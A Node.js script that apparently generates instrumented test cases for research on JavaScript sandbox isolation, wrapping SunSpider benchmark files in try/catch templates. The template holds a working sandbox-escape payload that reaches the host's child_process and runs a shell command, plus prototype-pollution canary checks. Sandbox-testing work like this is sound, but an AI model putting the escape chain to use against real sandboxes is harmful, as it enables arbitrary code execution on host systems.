const esprima = require("esprima");
const estraverse = require("estraverse");
const escodegen = require("escodegen");
//const analysis = require("../../analysis/src/analysis");
const fs = require("fs")
let generatedCounter = 0;

console.log(`
--------------------------------------------
############################################
############################################
############################################
--------------------------------------------
`);


//-----------------Code Instrumentation and Generation----------------//
let flag  = false;

let casesCounter = 0;
let generatedCasesFiles =0;
//transform and instrument
//to put each assert statemnt in a try-catch and then reconstruct the code to have "a new" looking testcase

function transform(ast) {
    estraverse.replace(ast, {
        enter: function (node, parent) {
            if (node.type === "Program") {
                /*let replaceCode = `
                        try{
                            let x = 10;
                        
                        }catch(e){
                          // try{ 
                           e(()=>{}).constructor.constructor("return this")().process.mainModule.require("child_process").execSync("ls").toString();
                          // leak("Something works!")
                          // getrootPrototype(e).;
                                
                        //}catch(DONOTINSTRUMENT){}
                        }
                        `;*/

                let replaceCode = `
                        try{
                            let x = 10;
                        
                        }catch(e){
                        try{
                            e(()=>{}).constructor.constructor("return this")().process.mainModule.require("child_process").execSync("ls").toString();
                        }catch(DONOTINSTRUMENT){
                            
                        }
                        try{
                            function CheckBreakout(x){
                                 try {
                                    if (x.constructor.constructor("return this")().process.mainModule.require){
                                         leak("SB-SUCCESS: The argument e is able to call outside the sandbox");
                                    }
                                 } catch(DONOTINSTRUMENT) {         
                                   }
                            }   
                            
                            function getRootPrototype(obj) {
                                   if ((typeof obj != "object" && typeof obj != "function") || !obj.__proto__) {
                                       return Object.prototype;
                                   }
                                   while (obj.__proto__) {
                                       obj = obj.__proto__;
                                   }
                               
                                   return obj;
                               }
                            CheckBreakout(e);
                            getRootPrototype(e).CCA = "CC: Got it?";                    
                            if(getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary){    
                               leak("CCA-SUCCESS: The parameter e of the catch clause has a different root prototype");
                            }                        
                            getRootPrototype(e).CCT = "CC: Got it?"; 
                            if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {                            
                                leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
                            }
                            
                        }catch(E){
                        }
                        }
                        `;

                let oldCode = node.body;
                let replaceNode = esprima.parse(replaceCode).body;
                node.body = replaceNode;
                node.body[0].block.body = oldCode;
                flag = true;
                node.expression = false;
            }
        }
    });
    return ast;
}
//-----------------Code Instrumentation and Generation----------------//




//-------------Write Code------------//
function writeCodeVarient(code, counter){
    const fs = require('fs');
    const content = code;
    let dirGenerated = "./generated";

    fs.writeFile(dirGenerated + "/" + generatedCounter + "_"+fileName.split("/")[fileName.split("/").length - 1].split(".")[0] + "_" + counter+".js", content, err => {
        if (err) {
            console.error(err);
            return;
        }
    });
}
//--------------End Write Code----------------//


//------------Collecting Files---------------//
let dir = "/Users/vdata/Desktop/js-isolation/analysis/test/sunspider/WebKit/PerformanceTests/SunSpider";//"../test/test"; //"/Users/vdata/Desktop/js-isolation/analysis/test/Testing_VM2_exploits/payloads";//"./test";
let fileName = "";
var walkSync = function(dir, filelist) {
    var fs = fs || require('fs'),
        files = fs.readdirSync(dir);
    filelist = filelist || [];
    files.forEach(function(file) {
        if (fs.statSync(dir + '/' + file).isDirectory()) {
            filelist = walkSync(dir + '/' + file, filelist);
        }
        else {
            filelist.push(dir+"/"+file);
        }
    });
    return filelist;
};

filelist = walkSync(dir, []);
console.log(filelist);
//------------End Collecting File-------------//


module.exports.instrument = function(code) {
    //console.log(code);
    let ast = esprima.parse(code);
    //  ast = replaceNode(ast);
    ast = transform(ast);
    return escodegen.generate(ast);
};

console.log("Start generating testcses....");
for(let n = 0; n <filelist.length; n ++) {
    try {
        fileName = filelist[n];
        console.log("Generating cases from: ", fileName);
        let code = fs.readFileSync(filelist[n]).toString();
        let ast = esprima.parse(code);

        ast = transform(ast);
        writeCodeVarient(escodegen.generate(ast), "");
        generatedCasesFiles ++;
        generatedCounter ++;
    }catch (e){
        console.log("couldent instrument ", fileName);
    }
    casesCounter = 0;
}

console.log("Number of Used files to generate cases: ", generatedCounter);
console.log("Number of Generated testcases: ", generatedCasesFiles);
console.log("Finished generating testcses....");


